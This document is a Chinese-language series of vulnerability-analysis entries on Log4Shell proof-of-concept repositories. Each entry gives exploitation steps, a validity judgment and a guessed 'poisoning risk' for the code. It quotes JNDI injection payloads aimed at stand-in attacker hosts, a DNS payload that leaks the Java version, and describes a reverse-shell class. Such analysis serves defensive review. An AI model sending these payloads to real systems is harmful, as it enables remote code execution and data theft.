**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

